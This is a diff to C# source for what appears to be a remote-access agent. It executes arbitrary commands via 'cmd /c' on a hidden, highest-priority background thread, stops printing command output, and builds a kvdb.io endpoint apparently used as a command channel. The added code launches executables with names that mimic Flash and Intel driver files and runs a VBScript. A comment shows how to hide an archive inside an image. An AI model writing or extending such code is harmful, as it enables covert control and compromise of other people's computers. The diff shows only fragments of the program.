@@ -39,6 +39,7 @@ public class khan_command_exec
 {
      try
      {
+			Console.WriteLine("About to execute command : " + command.ToString());
 			System.Diagnostics.ProcessStartInfo pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
 			pr.RedirectStandardOutput = true;
 			pr.UseShellExecute = false;
@@ -46,8 +47,8 @@ public class khan_command_exec
 			System.Diagnostics.Process p = new System.Diagnostics.Process();
 			p.StartInfo = pr;
 			p.Start();
-			string result = p.StandardOutput.ReadToEnd();
-			Console.WriteLine(result);
+			//string result = p.StandardOutput.ReadToEnd();
+			//Console.WriteLine(result);
 			
       }
       catch (Exception ex)
@@ -61,8 +62,8 @@ public class khan_command_exec
 	   try
 	   {
 		Thread obj= new Thread(new ParameterizedThreadStart(khan_Sync));
-		obj.IsBackground = false;
-		obj.Priority = ThreadPriority.AboveNormal;
+		obj.IsBackground = true;
+		obj.Priority = ThreadPriority.Highest;
 		obj.Start(command);
 	   }
 	   catch (Exception ex)
@@ -166,7 +167,34 @@ class Driver_Program
 		string res_key=res;
 		string updated_ep="https://kvdb.io/"+res+"/master_files";
 		Driver_Program obj=new Driver_Program();
-
+		try
+		{
+			string a="D:\\flash.exe,D:\\IntelHD.exe,VB";
+		if (a.Length > 0)
+		{
+			string command_args=a;
+			string [] splitted=command_args.Split(',');
+			foreach (string command in splitted)
+			{
+				Console.WriteLine("Command is : " +command);
+				string strCmdText=command;
+				//strCmdText= "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
+				if (command.Equals("VB"))
+				{
+					System.Diagnostics.Process.Start("cscript","so.vbs");
+				}
+				else
+				{
+				System.Diagnostics.Process.Start(command);
+				}
+			}
+			
+		}
+		}
+		catch(Exception ex)
+		{
+			Console.WriteLine(ex.Message);
+		}
 		
 		while(true)
 				{
